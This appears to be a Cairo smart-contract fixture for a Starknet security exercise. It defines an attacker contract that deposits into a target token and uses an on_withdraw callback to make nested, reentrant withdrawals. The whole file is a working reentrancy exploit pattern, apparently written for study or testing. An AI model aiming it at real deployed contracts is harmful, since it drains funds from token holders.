#[starknet::interface]
pub trait IAttacker<ContractState> {
    fn attack(ref self: ContractState, target_contract: ContractAddress);
    fn receive_tokens(ref self: ContractState);
}

#[starknet::contract]
pub mod Attacker {

    use starknet::ContractAddress;
    use core::integer::u256;
    use starknet::get_caller_address;
    use super::ITokenDispatcher;
    use super::ITokenDispatcherTrait;
    use super::IReceiver;
    use core::starknet::storage::{
        StoragePointerReadAccess,
        StoragePointerWriteAccess,
        Map
    };

    //////////////////////////////////////////////////////////
    /// STORAGE
    ///
    /// target: token contract being attacked.
    /// attack_count: tracks reentry attempts.
    //////////////////////////////////////////////////////////
    #[storage]
    pub struct Storage {
        target: ContractAddress,
        attack_count: u256,
    }

    //////////////////////////////////////////////////////////
    /// ATTACK IMPLEMENTATION
    //////////////////////////////////////////////////////////
    #[abi(embed_v0)]
    impl AttackerImpl of super::IAttacker<ContractState> {

        //////////////////////////////////////////////////////
        /// Initiates attack.
        ///
        /// 1. Stores target address.
        /// 2. Calls deposit (mints tokens).
        /// 3. Calls receive_tokens to start withdrawal chain.
        //////////////////////////////////////////////////////
        fn attack(ref self: ContractState, target_contract: ContractAddress) {

            self.target.write(target_contract);

            let token = ITokenDispatcher {
                contract_address: target_contract
            };

            // Mint tokens first
            token.deposit(1000);

            // Attempt withdrawal (reentrancy begins)
            self.receive_tokens();
        }

        //////////////////////////////////////////////////////
        /// First withdrawal attempt.
        /// Calls withdraw on target.
        //////////////////////////////////////////////////////
        fn receive_tokens(ref self: ContractState) {

            let target = self.target.read();
            let token = ITokenDispatcher { contract_address: target };

            let current_count = self.attack_count.read();
            self.attack_count.write(current_count + 1);

            if current_count < 3 {
                token.withdraw(500);
            }
        }
    }

    //////////////////////////////////////////////////////////
    /// REENTRANCY HOOK
    ///
    /// Called during Token.withdraw().
    /// Attempts nested withdraw.
    //////////////////////////////////////////////////////////
    #[abi(embed_v0)]
    impl ReceiverImpl of super::IReceiver<ContractState> {

        fn on_withdraw(ref self: ContractState, amount: u256) {

            let target = self.target.read();
            let token = ITokenDispatcher { contract_address: target };

            let current_count = self.attack_count.read();
            self.attack_count.write(current_count + 1);

            // Attempt nested withdraw
            if current_count < 3 {
                token.withdraw(250);
            }
        }
    }
}
